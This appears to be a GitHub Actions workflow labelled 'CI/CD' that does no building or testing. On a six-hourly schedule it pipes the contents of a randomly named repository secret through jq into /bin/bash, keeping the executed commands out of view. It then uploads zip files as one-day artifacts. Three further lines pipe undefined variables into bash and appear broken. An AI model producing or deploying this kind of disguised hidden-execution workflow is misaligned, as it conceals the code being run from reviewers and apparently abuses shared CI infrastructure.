name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '44 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  ci:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Launch
        env:
          lni85888: ${{ secrets.lni85888 }}
        run: |
          printf '%s' "$lni85888" | jq -r .lfne7 | /bin/bash
          printf '%s' "$sgss3" | jq -r .wc64935 | /bin/bash
          echo $zdgg874 | jq -r .v5 | /bin/bash
          printf '%s' "$uitt1" | jq -r .du554 | /bin/bash

      - name: Save artifact
        uses: actions/upload-artifact@v4
        with:
          name: shDSw1p7
          path: "*.zip"
          retention-days: 1
